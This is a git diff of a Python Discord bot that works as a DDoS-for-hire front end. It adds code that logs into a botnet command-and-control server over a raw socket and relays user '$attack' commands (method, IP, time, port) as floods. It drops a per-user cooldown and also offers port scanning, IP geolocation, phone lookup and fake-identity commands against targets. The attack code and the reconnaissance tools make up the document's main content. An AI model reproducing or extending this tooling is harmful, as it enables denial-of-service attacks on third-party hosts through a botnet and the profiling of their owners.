@@ -6,17 +6,33 @@ import discord
 from discord.ext import commands
 import requests
 import time
+import os
+import json 
+import socket
+import sys
 from discord import User
 from discord.ext.commands import has_permissions
 
 start_time = time.time()
 
-ver = "1.0"
+ver = "1.1"
 
-bot = commands.Bot(command_prefix="$")
+# DDoS API setup
+host = ""
+CNCport = ""
+username = ""
+password = ""
+shellprompt = ""
+
+# c99.nl API setup
+c99key = ""
+
+# Discord bot token
+bottoken = ""
+
+# Bot prefix
+bot = commands.Bot(command_prefix="$") 
 bot.remove_command('help')
-bot.remove_command('methods')
-bot.remove_command('plans')
 
 @bot.command()
 async def help(self):
@@ -34,7 +50,7 @@ async def help(self):
 async def attacktut(ctx):
     plan = discord.Embed(title="Attack Tutorial", 
         color=0x992d22)
-    plan.add_field(name="Example", value="▸ $attack [host] [port] [time] [method]", inline=False)
+    plan.add_field(name="Example", value="▸ $attack [method] [ip] [time] [port]", inline=False)
     plan.set_footer(text="Developed by Alyx#7777")
     await ctx.send(embed=plan) 
 
@@ -74,44 +90,62 @@ async def tools(ctx):
 
 @bot.command()
 async def changelog(ctx):
-    changelog = discord.Embed(title="Changelog version 1.0", 
+    changelog = discord.Embed(title="Changelog version 1.1", 
         color=0x992d22)
-    changelog.add_field(name="Created bot", value="▸ First version released", inline=False)
+    changelog.add_field(name="Cleaned up DDoS command", value="▸ Added f strings and socket connect", inline=False)
     changelog.set_footer(text="Developed by Alyx#7777")
     await ctx.send(embed=changelog)  
 
 # DDoS Layer 4 
 @bot.command()
-@commands.cooldown(1, 120, commands.BucketType.user)
-async def attack(ctx, host, port, secs, method):
-        if int(secs) <= 1200:
-            logger = {"content": "```-----------xyz Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
-            requests.post(url='DISCORD WEBHOOK URL FOR LOGGER GOES HERE',data=logger)
-            requests.get('API LINK GOES HERE&host='+host+'&port='+port+'&time='+secs+'&method='+method)
-            sent = discord.Embed(title="xyz has sent an attack!", color=0xe61010)
-            sent.add_field(name="IP:", value=f"▸ {host}", inline=False)
-            sent.add_field(name="Port:", value=f"▸ {port}", inline=False)
-            sent.add_field(name="Seconds:", value=f"▸ {secs}", inline=False)
-            sent.add_field(name="Method:", value=f"▸ {method}", inline=False)
-            msg = await ctx.send(embed=sent)
-            isec = int(secs)
-            while isec > 0:
-                isec -= 1
-                after = discord.Embed(title="xyz has sent an attack!", color=0xe61010)
-                after.add_field(name="Host:", value=f"▸ {host}", inline=False)
-                after.add_field(name="Port:", value=f"▸ {port}", inline=False)
-                after.add_field(name="Seconds:", value=f"▸ {isec}", inline=False)
-                after.add_field(name="Method:", value=f"▸ {method}", inline=False)
-                await msg.edit(embed=after)
-                time.sleep(1)
-        elif int(secs) > 1200:
-            invalid_syntax = discord.Embed(title="You cannot send an attack greater than 1200 seconds", color=0xe61010)
-            await ctx.send(embed=invalid_syntax)
+async def parsetocnc(vec: str, target: str, timestamp: str, port: str):
+	attack = "%s %s %s dport=%s" %(vec, target, timestamp, port) # make attakck.
+	print("Parsing: %s" %(attack))
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # setup socket to connect to CNC
+	s.connect((host, CNCport)) # connect to CNC to send attack
+
+	s.send("\r\n".encode()) # send new line because of the IAC negotiation
+
+	buf = s.recv(1024) # receive/
+
+	s.send("{}\r\n".format(username).encode()) # login with username
+	time.sleep(1) # sleep for a second to give cnc time to respond
+	s.send("{}\r\n".format(password).encode()) # send password to complete login
+	while(True):
+		buf = s.recv(1024) # recv to wait until shell prompt
+		if(shellprompt in str(buf)): # wait for shell prompt to send attack
+			s.send("{}\r\n".format(attack).encode()) # send attack.
+			return(True)
+
+async def parseflood(arg: str, message): # give function an argument and point it to a string (async for message.channel.send)
+	try:
+		attackvec = arg.split("$attack ")[1].split(" ")[0]  # get attack 
+		print("Attack vec: %s" %(attackvec)) # print attack vector
+		target = arg.split(" ")[2].split(" ")[0]  # get target
+		print("Target: %s" %(target))
+		timesec = arg.split(" ")[3].split(" ")[0]  # get time
+		print("Time: %s" %(timesec))
+		port = arg.split(" ")[4].split(" ")[0]  # get port
+		print("port: %s" %(port))
+
+		if(int(timesec) <= 900): # the highest amount of time the attack can be (in seconds)
+			await parsetocnc(attackvec, target, timesec, port)
+		else:
+			await message.channel.send("Attack time too long. (900 is max)")
+	except(IndexError) as err: # except if the command didn't parse correctly.
+		await message.channel.send("Incorrect command format for the attack! %s" %(err))
+	
+
+@bot.event # setup asynchronous listener for on_message event
+async def on_message(message): # on_message event (gets triggered when message gets sent)
+	if("$attack" in message.content): # check if $attack is in the message
+		await parseflood(message.content, message) # call parse flood function await it because async
 
 # Web Tools
 @bot.command()
-async def portscan(self,ip):
-    portsjsonified=requests.get('https://api.c99.nl/portscanner?key=YOUR API KEY&host='+ip+'&json')
+async def portscan(self,ip): 
+    portsjsonified=requests.get(f"https://api.c99.nl/portscanner?key={c99key}&host={ip}&json")
     ports=json.loads(portsjsonified.text)
     embed = discord.Embed(title='xyz PortScanner',color=0x992d22)
     embed.add_field(name='Open Ports',value=ports['port'].replace(',','\n'))
@@ -120,7 +154,7 @@ async def portscan(self,ip):
     
 @bot.command()
 async def ping(self,ip):
-    upordown=requests.get('https://api.c99.nl/ping?key=YOUR API KEY&host='+ip+'&json')
+    upordown=requests.get(f"https://api.c99.nl/ping?key={c99key}&host={ip}&json")
     resalts = json.loads(upordown.text)
     embed = discord.Embed(title='xyz Pinger',color=0x992d22)
     embed.add_field(name='Result',value='Up: '+'**'+str(resalts['success'])+'**')
@@ -130,7 +164,7 @@ async def ping(self,ip):
 
 @bot.command()
 async def geoip(self,ip):
-    geoip = requests.get('https://api.c99.nl/geoip?key=YOUR API KEY&host='+ip)
+    geoip = requests.get(f"https://api.c99.nl/geoip?key={c99key}&host={ip}")
     embed=discord.Embed(title='xyz GeoIP:', color=0x992d22)
     embed.add_field(name='Geolocation information:',value=geoip.text.replace('<br>','\n'))
     embed.set_footer(text="Developed by Alyx#7777")
@@ -138,7 +172,7 @@ async def geoip(self,ip):
  
 @bot.command()
 async def geninfo(self,gender):
-    geninfo = requests.get('https://api.c99.nl/randomperson?key=YOUR API KEY&gender='+gender)
+    geninfo = requests.get(f"https://api.c99.nl/randomperson?key={c99key}&gender={gender}")
     embed=discord.Embed(title='xyz Info Generator:', color=0x992d22)
     embed.add_field(name='Generator Results:',value=geninfo.text.replace('<br>','\n'))
     embed.set_footer(text="Developed by Alyx#7777")
@@ -146,7 +180,7 @@ async def geninfo(self,gender):
 
 @bot.command()
 async def checkweb(self,website):
-    checkweb = requests.get('https://api.c99.nl/upordown?key=YOUR API KEY&host='+website)
+    checkweb = requests.get(f"https://api.c99.nl/upordown?key={c99key}&host={website}")
     embed=discord.Embed(title='xyz Website Checker:', color=0x992d22)
     embed.add_field(name='Checker Results:',value=checkweb.text.replace('<br>','\n'))
     embed.set_footer(text="Developed by Alyx#7777")
@@ -154,7 +188,7 @@ async def checkweb(self,website):
 
 @bot.command()
 async def ip2domain(self,domain):
-    ip2domain = requests.get('https://api.c99.nl/ip2domains?key=YOUR API KEY&ip='+domain)
+    ip2domain = requests.get(f"https://api.c99.nl/ip2domains?key={c99key}&ip={domain}")
     embed=discord.Embed(title='xyz Website Checker:', color=0x992d22)
     embed.add_field(name='Checker Results:',value=ip2domain.text.replace('<br>','\n'))
     embed.set_footer(text="Developed by Alyx#7777")
@@ -162,7 +196,7 @@ async def ip2domain(self,domain):
  
 @bot.command()
 async def phonelookup(self,number):
-    phonelookup = requests.get('https://api.c99.nl/phonelookup?key=YOUR API KEY&number='+number)
+    phonelookup = requests.get(f"https://api.c99.nl/phonelookup?key={c99key}&number={number}")
     embed=discord.Embed(title='xyz Phone Lookup:', color=0x992d22)
     embed.add_field(name='Lookup Results:',value=phonelookup.text.replace('<br>','\n'))
     embed.set_footer(text="Developed by Alyx#7777")
@@ -170,7 +204,7 @@ async def phonelookup(self,number):
 
 @bot.command()
 async def urlshortener(self,website):
-    urlshortener = requests.get('https://api.c99.nl/urlshortener?key=YOUR API KEY&url='+website)
+    urlshortener = requests.get(f"https://api.c99.nl/urlshortener?key={c99key}&url={website}")
     embed=discord.Embed(title='xyz URL Shortener:', color=0x992d22)
     embed.add_field(name='Lookup Results:',value=urlshortener.text.replace('<br>','\n'))
     embed.set_footer(text="Developed by Alyx#7777")
@@ -192,11 +226,6 @@ async def stats(ctx):
     embed.set_footer(text="Developed by Alyx#7777")
     await ctx.send(embed=embed)
 
-@attack.error
-async def attack_error(self,error):
-    embed = discord.Embed(title='Cooldown',description = 'You are on cooldown try again in: '+str(round(error.retry_after))+' secs', color=0x992d22)
-    await self.send(embed=embed)
-
 @bot.command()
 async def profile(message):
         user = message.author.id
@@ -212,4 +241,4 @@ async def profile(message):
 async def on_ready():
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="anonymous"))
     print("Bot is ready!")
-bot.run('YOUR KEY GOES HERE')
+bot.run(bottoken)
